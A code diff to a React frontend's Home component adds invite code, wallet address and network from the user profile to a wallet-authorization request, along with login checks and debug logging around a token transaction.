@@ -252,16 +252,38 @@ function Home() {
   // 替换钱包授权查询为mutation
   const { mutateAsync: getWalletAuth } = useMutation({
     mutationFn: async () => {
+      if (!userProfile?.user) {
+        throw new Error('用户未登录');
+      }
+
+      const { invitedBy, address, network } = userProfile.user;
+      console.log('邀请码:', invitedBy);
+      console.log('钱包地址:', address);
+      console.log('网络:', network);
+      
+      
+      if (!invitedBy || !address || !network) {
+        throw new Error('用户信息不完整');
+      }
+
       const response = await axios.post('/wallets/get-wallet-Authorization', {
-        address
+        invitedBy,    // 使用用户信息中的邀请码
+        address,      // 使用用户信息中的地址
+        network      // 使用用户信息中的网络
       });
       return response.data.data;
     }
   });
+
   // 处理加入按钮点击
   const handleJoin = async () => {
     console.log('1. 按钮被点击');
-    console.log('当前钱包地址:', address);
+    console.log('当前用户信息:', userProfile?.user);
+
+    if (!userProfile?.user) {
+      toast.error('请先登录');
+      return;
+    }
 
     if (!address && openConnectModal) {
       console.log('2. 钱包未连接，打开连接弹窗');
@@ -299,6 +321,8 @@ function Home() {
           parseUnits('0.01', 6),
         ],
       });
+
+      console.log('授权地址++++++++++++++++++++++++++++++++++++++++++++++:', hash); // 打印授权地址
 
       // 保存交易哈希
       setTxHash(hash);
